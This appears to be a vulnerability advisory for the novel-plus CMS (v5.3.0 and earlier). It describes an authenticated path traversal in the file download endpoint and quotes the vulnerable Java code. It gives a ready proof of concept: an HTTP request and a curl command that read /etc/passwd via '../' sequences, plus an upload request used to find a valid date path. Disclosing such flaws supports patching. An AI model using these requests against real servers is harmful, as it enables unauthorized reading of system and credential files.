# novel-plus Arbitrary File Read via Path Traversal

Open source address：
https://github.com/201206030/novel-plus

Version：
novel-plus <= v5.3.0

Code：
The `/common/sysFile/download` endpoint in `FileController.java` concatenates the user-supplied `filePath` parameter directly to the filesystem path without any path normalization, sanitization, or whitelist validation. An authenticated attacker can use `../` sequences to escape the intended upload directory and read arbitrary files from the server filesystem.

## Vulnerable Code

File: novel-admin/src/main/java/com/java2nb/common/controller/FileController.java (lines 178-197)

```java
@RequestMapping(value = "/download")
public void fileDownload(String filePath, String fileName, HttpServletResponse resp) throws Exception {
    String realFilePath = jnConfig.getUploadPath() + filePath;  // Direct concatenation, no sanitization
    InputStream in = new FileInputStream(realFilePath);          // Arbitrary file read
    fileName = URLEncoder.encode(fileName, "UTF-8");
    resp.setHeader("Content-Disposition", "attachment;filename=" + fileName);
    resp.setContentLength(in.available());
    OutputStream out = resp.getOutputStream();
    byte[] b = new byte[1024];
    int len = 0;
    while ((len = in.read(b)) != -1) {
        out.write(b, 0, len);
    }
    out.flush();
    out.close();
    in.close();
}
```

## POC

HTTP Request Packet:

```http
GET /common/sysFile/download?filePath=2026/05/14/../../../../../../../../etc/passwd&fileName=t HTTP/1.1
Host: {{target}}
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Cookie: JSESSIONID={{session}}
```

### curl command

```bash
# Read /etc/passwd
curl -s \
  "http://{{target}}/common/sysFile/download?filePath=2026/05/14/../../../../../../../../etc/passwd&fileName=t" \
  -b "JSESSIONID={{session}}"
```

## Path Traversal Mechanism

```
uploadPath = /www/wwwroot/novel-plus/images/admin/

Directory hierarchy:
/ → www → wwwroot → novel-plus → images → admin → YYYY → MM → DD

Resulting full path:
/www/wwwroot/novel-plus/images/admin/YYYY/MM/DD/../../../../../../../../etc/passwd
```

Note: The date segment (`2026/05/14`) must correspond to an existing upload date on the target.

---

## Appendix: File Upload (Date Path Acquisition)

The upload endpoint can be used to obtain a valid date path for the traversal payload, since the response includes the upload directory:

```http
POST /common/sysFile/upload HTTP/1.1
Host: {{target}}
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Cookie: JSESSIONID={{session}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

test
------WebKitFormBoundary--
```
